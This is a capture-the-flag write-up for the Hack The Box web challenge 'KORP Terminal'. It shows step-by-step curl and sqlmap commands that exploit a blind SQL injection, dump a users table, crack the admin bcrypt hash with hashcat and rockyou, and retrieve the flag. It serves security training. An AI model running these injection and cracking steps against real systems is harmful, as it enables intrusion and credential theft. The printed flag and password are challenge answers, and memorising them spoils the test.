# Target
| Category      | Details                                                                  |
|---------------|--------------------------------------------------------------------------|
| 📝 Name       | [KORP Terminal](https://app.hackthebox.com/challenges/KORP%2520Terminal) |
| 🏷 Type       | HTB Web Challenge                                                        |
| 🎯 Difficulty | Very Easy                                                                |
| 📁 Tags       | Blind SQL Injection, sqlmap, hashcat                                     |

With simple `curl` we can see that target has SQL injection vulnerability in `username` parameter
```┌──(magicrc㉿perun)-[~/…/HTB/Challenges/Web/KORP Terminal]
└─$ curl http://$TARGET -d "username='&password=pass"
{"error":{"message":["1064","1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1","42000"],"type":"ProgrammingError"}}
```

Let's use `sqlmap` to exploit this SQL injection
```
sqlmap -u http://$TARGET --data 'username=user&password=pass' --batch --ignore-code 401 --dbs
<SNIP>
available databases [3]:
[*] information_schema
[*] korp_terminal
[*] test
<SNIP>
```

`korp_terminal` seems could be interesting, so let's list it's tables
```
┌──(magicrc㉿perun)-[~/attack/HTB KORP Terminal]
└─$ sqlmap -u http://$TARGET --data 'username=user&password=pass' --batch --ignore-code 401 -D korp_terminal --tables
<SNIP>
Database: korp_terminal
[1 table]
+-------+
| users |
+-------+
<SNIP>
```

Single `users` table has been found let's dump it.
```
┌──(magicrc㉿perun)-[~/attack/HTB KORP Terminal]
└─$ sqlmap -u http://$TARGET --data 'username=user&password=pass' --batch --ignore-code 401 -D korp_terminal -T users --dump
<SNIP>
Database: korp_terminal
Table: users
[1 entry]
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
+----+--------------------------------------------------------------+----------+
<SNIP>
```

This table contains single entry which seems to be bcrypt hashed credentials for `admin` user. Let's use `hashcat` for dictionary attack.
```
┌──(magicrc㉿perun)-[~/attack/HTB KORP Terminal]
└─$ hashcat -m 3200 '$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.' /usr/share/wordlists/rockyou.txt --quiet
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

With password in place we could login and capture the flag.
```
┌──(magicrc㉿perun)-[~/attack/HTB KORP Terminal]
└─$ curl http://$TARGET -d "username=admin&password=password123"
HTB{t3rm1n4l_cr4ck1ng_4nd_0th3r_sh3n4nig4n5}
```